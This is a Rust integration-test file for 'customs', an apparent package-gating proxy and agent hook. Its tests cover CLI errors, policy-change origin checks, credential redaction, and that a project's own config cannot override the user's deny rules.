    let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    format!("http://{}", l.local_addr().unwrap())
}

/// Run the real binary (see [`customs_cmd`]) with extra environment and stdin, killed after
/// `secs`: (stdout, stderr, exit code, or -1 when it had to be killed).
fn run_customs(
    args: &[&str],
    envs: &[(&str, &str)],
    stdin: &str,
    secs: u64,
) -> (String, String, i32) {
    use std::io::{Read, Write};
    use std::process::Stdio;
    let data = tempfile::tempdir().unwrap();
    let mut child = customs_cmd(data.path(), None)
        .args(args)
        .envs(envs.iter().copied())
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(stdin.as_bytes())
        .unwrap();
    let deadline = std::time::Instant::now() + Duration::from_secs(secs);
    let code = loop {
        if let Some(s) = child.try_wait().unwrap() {
            break s.code().unwrap_or(-1);
        }
        if std::time::Instant::now() > deadline {
            let _ = child.kill();
            let _ = child.wait();
            break -1;
        }
        std::thread::sleep(Duration::from_millis(50));
    };
    let (mut out, mut err) = (String::new(), String::new());
    child
        .stdout
        .take()
        .unwrap()
        .read_to_string(&mut out)
        .unwrap();
    child
        .stderr
        .take()
        .unwrap()
        .read_to_string(&mut err)
        .unwrap();
    (out, err, code)
}

#[test]
fn env_backed_flags_accept_1_0_yes_and_no() {
    let dir = tempfile::tempdir().unwrap();
    // The shipped compose file and k8s manifest set CUSTOMS_LOG_JSON to "1".
    for v in ["1", "0", "yes", "true"] {
        let (out, err, code) = run_customs(&["env"], &[("CUSTOMS_LOG_JSON", v)], "", 30);
        assert_eq!(code, 0, "CUSTOMS_LOG_JSON={v}: {err}");
        assert!(out.contains("PIP_INDEX_URL"), "{out}");
    }
    let input = json!({
        "session_id": "t",
        "cwd": dir.path(),
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": "ls"},
    })
    .to_string();
    let server = dead_server();
    for v in ["1", "0", "no"] {
        let (_, err, code) = run_customs(
            &["hook", "claude-code", "--server", &server],
            &[("CUSTOMS_HOOK_FAIL_CLOSED", v)],
            &input,
            30,
        );
        assert_eq!(code, 0, "CUSTOMS_HOOK_FAIL_CLOSED={v}: {err}");
        assert!(!err.contains("invalid value"), "{err}");
    }
}

#[test]
fn serve_refuses_a_missing_explicit_dashboard_dir() {
    let dir = tempfile::tempdir().unwrap();
    let ui = dir.path().join("no-such-ui");
    let data = dir.path().join("data");
    let (_, err, code) = run_customs(
        &[
            "serve",
            "--bind",
            "127.0.0.1:0",
            "--data-dir",
            data.to_str().unwrap(),
            "--ui-dir",
            ui.to_str().unwrap(),
        ],
        &[("CUSTOMS_ALLOW_ANONYMOUS_POLICY_CHANGES", "1")],
        "",
        30,
    );
    assert_eq!(code, 1, "{err}");
    assert!(err.contains(ui.to_str().unwrap()), "{err}");
}

#[test]
fn serve_refuses_an_empty_admin_token() {
    let dir = tempfile::tempdir().unwrap();
    let data = dir.path().join("data");
    let data = data.to_str().unwrap();
    let (_, err, code) = run_customs(
        &["serve", "--bind", "127.0.0.1:0", "--data-dir", data],
        &[("CUSTOMS_ADMIN_TOKEN", "")],
        "",
        30,
    );
    assert_eq!(code, 1, "{err}");
    assert!(err.contains("CUSTOMS_ADMIN_TOKEN"), "{err}");
    let file = dir.path().join("token");
    std::fs::write(&file, "\n").unwrap();
    let (_, err, code) = run_customs(
        &[
            "serve",
            "--bind",
            "127.0.0.1:0",
            "--data-dir",
            data,
            "--admin-token-file",
            file.to_str().unwrap(),
        ],
        &[],
        "",
        30,
    );
    assert_eq!(code, 1, "{err}");
    assert!(err.contains(file.to_str().unwrap()), "{err}");
}

#[test]
fn an_unusable_data_dir_is_named_with_a_remedy() {
    let dir = tempfile::tempdir().unwrap();
    // A data dir below a regular file cannot be created.
    let file = dir.path().join("plain-file");
    std::fs::write(&file, "x").unwrap();
    let bad = file.join("data");
    let bad = bad.to_str().unwrap();
    let server = dead_server();
    let (_, err, code) = run_customs(
        &[
            "check",
            "pypi",
            "requests",
            "--server",
            &server,
            "--data-dir",
            bad,
        ],
        &[],
        "",
        60,
    );
    assert_eq!(code, 1, "{err}");
    assert!(err.contains(bad), "{err}");
    assert!(err.contains("--data-dir"), "{err}");
    let (_, err, code) = run_customs(
        &["serve", "--bind", "127.0.0.1:0", "--data-dir", bad],
        &[],
        "",
        30,
    );
    assert_eq!(code, 1, "{err}");
    assert!(err.contains(bad), "{err}");
}

#[test]
fn serve_on_a_taken_port_says_how_to_pick_another() {
    let taken = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = taken.local_addr().unwrap().to_string();
    let dir = tempfile::tempdir().unwrap();
    let data = dir.path().join("data");
    let (_, err, code) = run_customs(
        &[
            "serve",
            "--bind",
            &addr,
            "--data-dir",
            data.to_str().unwrap(),
        ],
        &[],
        "",
        30,
    );
    assert_eq!(code, 1, "{err}");
    assert!(err.contains("--bind"), "{err}");
    assert!(err.contains("CUSTOMS_BIND"), "{err}");
}

#[test]
fn doctor_refuses_a_missing_directory() {
    let dir = tempfile::tempdir().unwrap();
    let missing = dir.path().join("nope");
    let server = dead_server();
    let (out, err, code) = run_customs(
        &["doctor", missing.to_str().unwrap(), "--server", &server],
        &[],
        "",
        30,
    );
    assert_eq!(code, 1, "{err}");
    assert!(err.contains("no such directory"), "{err}");
    assert!(err.contains(missing.to_str().unwrap()), "{err}");
    assert!(out.is_empty(), "{out}");
}

/// `[upstream]` lines pointing every registry at `base`.
fn upstream_toml(base: &str) -> String {
    format!(
        "[upstream]\npypi_simple = \"{base}/simple\"\npypi_files = \"{base}/files\"\npypi_json = \"{base}/pypi\"\nnpm = \"{base}/npm\"\n"
    )
}

/// The hook, `check` and `scan` run in the agent's project, which may be hostile: its
/// `customs.toml` and `models/` must not steer the in-process checks.
#[tokio::test(flavor = "multi_thread")]
async fn in_process_checks_ignore_a_projects_customs_toml_and_models() {
    let mock = start_mock().await;
    let dir = tempfile::tempdir().unwrap();
    let data = dir.path().join("data");
    std::fs::create_dir_all(&data).unwrap();
    std::fs::write(
        data.join("policy.toml"),
        format!(
            "deny = [\"pypi:goodpkg\", \"npm:left-padd\"]\n{}",
            upstream_toml(&mock.base)
        ),
    )
    .unwrap();
    // The project allows what the user denies, and plants its own models.
    let project = dir.path().join("project");
    let planted = project.join("models");
    std::fs::create_dir_all(&planted).unwrap();
    let dev = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../models/dev");
    for f in std::fs::read_dir(&dev).unwrap() {
        let f = f.unwrap().path();
        std::fs::copy(&f, planted.join(f.file_name().unwrap())).unwrap();
    }
    let manifest = std::fs::read_to_string(planted.join("manifest.json")).unwrap();
    std::fs::write(
        planted.join("manifest.json"),
        manifest.replace("dev-untrained", "project-planted"),
    )
    .unwrap();
    std::fs::write(
        project.join("customs.toml"),
        format!(
            "mode = \"monitor\"\nallow = [\"pypi:goodpkg\", \"npm:left-padd\"]\n{}",
            upstream_toml(&mock.base)
        ),
    )
    .unwrap();
    std::fs::write(
        project.join("left-padd-1.0.0.tgz"),
        npm_tgz(&[(
            "package/package.json",
            r#"{"name":"left-padd","version":"1.0.0"}"#,
        )]),
    )
    .unwrap();
    let server = dead_server();
    let run = {
        let (data, project) = (data.clone(), project.clone());
        move |args: &[&str], keep_models: bool, stdin: &str| {
            use std::io::Write;
            use std::process::Stdio;
            let mut c = customs_cmd(&data, None);
            if !keep_models {
                c.env_remove("CUSTOMS_MODELS");
            }
            let mut child = c
                .args(args)
                .current_dir(&project)
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .unwrap();
            child
                .stdin
                .take()
                .unwrap()
                .write_all(stdin.as_bytes())
                .unwrap();
            let o = child.wait_with_output().unwrap();
            (
                String::from_utf8_lossy(&o.stdout).into_owned(),
                String::from_utf8_lossy(&o.stderr).into_owned(),
                o.status.code().unwrap_or(-1),
            )
        }
    };
    let hook_input = json!({
        "session_id": "t",
        "cwd": project,
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": "pip install goodpkg==1.0.0"},
    })
    .to_string();
    let srv = server.clone();
    let (checked, scanned, hooked, malformed) = tokio::task::spawn_blocking(move || {
        let checked = run(
            &[
                "check",
                "pypi",
                "goodpkg==1.0.0",
                "--json",
                "--server",
                &srv,
            ],
            false,
            "",
        );
        let scanned = run(
            &[
                "scan",
                "left-padd-1.0.0.tgz",
                "--name",
                "left-padd",
                "--json",
            ],
            true,
            "",
        );
        let hooked = run(
            &["hook", "claude-code", "--server", &srv],
            false,
            &hook_input,
        );
        // A malformed project file must not make the hook fail open either.
        std::fs::write(project.join("customs.toml"), "mode = \"off\"\n[[[").unwrap();
        let malformed = run(
            &["hook", "claude-code", "--server", &srv],
            false,
            &hook_input,
        );
        (checked, scanned, hooked, malformed)
    })
    .await
    .unwrap();

    let (out, err, code) = &checked;
    assert_eq!(*code, 3, "{out}{err}");
    let v: Value = serde_json::from_str(out).unwrap();
    assert_eq!(v["decision"], "block", "{v}");
    assert_eq!(v["mode"], "enforce", "{v}");
    assert_ne!(v["model_version"], "project-planted", "{v}");
    let (out, err, code) = &scanned;
    assert_eq!(*code, 3, "{out}{err}");
    let v: Value = serde_json::from_str(out).unwrap();
    assert!(rules_of(&v).contains(&"deny".to_string()), "{v}");
    for (out, err, code) in [&hooked, &malformed] {
        assert_eq!(*code, 0, "{err}");
        let d: Value = serde_json::from_str(out.trim()).unwrap_or_else(|_| panic!("{out:?} {err}"));
        assert_eq!(d["hookSpecificOutput"]["permissionDecision"], "deny", "{d}");
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn the_vite_dev_origin_cannot_change_the_policy() {
    let h = Harness::start(|_| {}).await;
    let mut p: Value = h.get("/api/policy").await.json().await.unwrap();
    p["mode"] = json!("monitor");
    // Any page served on Vite's default port, from any project.
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .header("origin", "http://localhost:5173")
        .json(&p)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 403);
    assert_eq!(h.engine.policy().mode, Mode::Enforce);
    let r = h
        .http
        .get(format!("{}/api/events", h.base))
        .header("origin", "http://localhost:5173")
        .send()
        .await
        .unwrap();
    assert!(r.headers().get("access-control-allow-origin").is_none());
    // The dev server proxies /api with the browser's Host, so its dashboard is same-origin.
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .header("host", "localhost:5173")
        .header("origin", "http://localhost:5173")
        .json(&p)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn healthz_says_whether_the_models_are_trained() {
    let h = Harness::start(|_| {}).await;
    let v: Value = h.get("/healthz").await.json().await.unwrap();
    assert_eq!(v["status"], "ok");
    assert_eq!(v["untrained"], true, "{v}");
    assert_eq!(v["models_loaded"], true, "{v}");
    h.stop().await;

    // A server that found no models runs on the policy rules alone, and says so.
    let dir = tempfile::tempdir().unwrap();
    let engine = Engine::new(EngineConfig {
        data_dir: dir.path().to_path_buf(),
        models: Models::empty(),
        policy: Policy::default(),
        policy_path: dir.path().join("policy.toml"),
        scanner: fake_scanner(Arc::default()),
        limits: Limits::default(),
        metrics: Arc::new(Metrics::new()),
    })
    .unwrap();
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let (tx, rx) = tokio::sync::oneshot::channel::<()>();
    let server = tokio::spawn(customs::server::serve_with(
        listener,
        engine,
        None,
        ServeOptions::default(),
        async move {
            let _ = rx.await;
        },
    ));
    let http = reqwest::Client::builder().no_proxy().build().unwrap();
    let v: Value = http
        .get(format!("{base}/healthz"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(v["models_loaded"], false, "{v}");
    assert_eq!(v["model_version"], "none", "{v}");
    let _ = tx.send(());
    server.await.unwrap().unwrap();
}

#[tokio::test(flavor = "multi_thread")]
async fn a_policy_change_the_log_cannot_record_is_still_reported_as_applied() {
    let h = Harness::start(|_| {}).await;
    let db = rusqlite::Connection::open(h._dir.path().join("customs.db")).unwrap();
    db.execute_batch("DROP TABLE policy_changes").unwrap();
    drop(db);
    let mut changes = h.engine.subscribe_policy_changes();
    let mut p: Value = h.get("/api/policy").await.json().await.unwrap();
    p["mode"] = json!("monitor");
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .json(&p)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    let warning = r.headers()["x-customs-warning"]
        .to_str()
        .unwrap()
        .to_string();
    assert!(warning.contains("change log"), "{warning}");
    let body: Value = r.json().await.unwrap();
    assert_eq!(body["mode"], "monitor");
    assert_eq!(h.engine.policy().mode, Mode::Monitor);
    // Counted and announced (the webhook listens to this) like any applied change.
    let ch = changes.try_recv().unwrap();
    assert_eq!(ch.changes[0].field, "mode");
    let metrics = h.get("/metrics").await.text().await.unwrap();
    assert!(
        metrics.contains("customs_policy_changes_total{result=\"applied\"} 1"),
        "{metrics}"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn bad_query_and_path_parameters_get_json_errors() {
    let h = Harness::start(|_| {}).await;
    for path in [
        "/api/events?limit=abc",
        "/api/stats?days=x",
        "/api/policy/changes?limit=-1",
        "/api/verdicts/abc",
    ] {
        let r = h.get(path).await;
        assert_eq!(r.status(), 400, "{path}");
        let v: Value = r.json().await.unwrap();
        assert!(v["error"].is_string(), "{path}: {v}");
    }
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_partial_policy_put_is_refused_with_the_missing_keys() {
    let h = Harness::start(|p| p.deny = vec!["npm:evil-js".into()]).await;
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .body(r#"{"mode": "enforce"}"#)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 400);
    let e: Value = r.json().await.unwrap();
    let msg = e["error"].as_str().unwrap();
    assert!(msg.contains("deny") && msg.contains("upstream"), "{msg}");
    assert!(e["errors"]
        .as_array()
        .unwrap()
        .iter()
        .any(|x| x["field"] == "allow"));
    // A nested table must be whole too.
    let mut p: Value = h.get("/api/policy").await.json().await.unwrap();
    p["established"] = json!({"enabled": false});
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .json(&p)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 400);
    let e: Value = r.json().await.unwrap();
    assert!(
        e["error"].as_str().unwrap().contains("established.top"),
        "{e}"
    );
    assert_eq!(h.engine.policy().deny, vec!["npm:evil-js".to_string()]);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn upstream_credentials_are_redacted_but_kept() {
    let h = Harness::start(|p| {
        p.upstream.npm = p.upstream.npm.replace("http://", "http://user:s3cret@");
    })
    .await;
    let text = h.get("/api/policy").await.text().await.unwrap();
    assert!(!text.contains("s3cret"), "{text}");
    assert!(text.contains("http://***@127.0.0.1"), "{text}");
    // Sending back what the dashboard read keeps the stored credentials.
    let mut p: Value = serde_json::from_str(&text).unwrap();
    p["mode"] = json!("monitor");
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .json(&p)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    assert!(!r.text().await.unwrap().contains("s3cret"));
    assert!(h.engine.policy().upstream.npm.contains("user:s3cret@"));
    let saved = std::fs::read_to_string(h.engine.policy_path()).unwrap();
    assert!(saved.contains("user:s3cret@"), "{saved}");
    // New credentials are accepted, and the change log shows neither.
    p["upstream"]["npm"] = json!("https://other:pw-two@npm.example/registry");
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .json(&p)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    assert!(h.engine.policy().upstream.npm.contains("pw-two"));
    let log = h.get("/api/policy/changes").await.text().await.unwrap();
    assert!(!log.contains("s3cret") && !log.contains("pw-two"), "{log}");
    assert!(log.contains("https://***@npm.example/registry"), "{log}");
    h.stop().await;
}

/// `--allowed-hosts` (`CUSTOMS_ALLOWED_HOSTS`) comes in through the server's options, so
/// the developer's own environment does not change what these tests see.
#[tokio::test(flavor = "multi_thread")]
async fn an_allowed_host_name_may_change_the_policy() {
    let opts = ServeOptions {
        allowed_hosts: vec!["Customs".into()],
        ..Default::default()
    };
    let h = Harness::start_serving(|_| {}, None, Limits::default(), "127.0.0.1:0", opts).await;
    let p: Value = h.get("/api/policy").await.json().await.unwrap();
    for (host, status) in [("customs:7878", 200), ("other.example:7878", 403)] {
        let r = h
            .http
            .put(format!("{}/api/policy", h.base))
            .header("host", host)
            .json(&p)
            .send()
            .await
            .unwrap();
        assert_eq!(r.status(), status, "{host}");
    }
    let r = h
        .http
        .get(format!("{}/api/events", h.base))
        .header("host", "customs:7878")
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    h.stop().await;
}
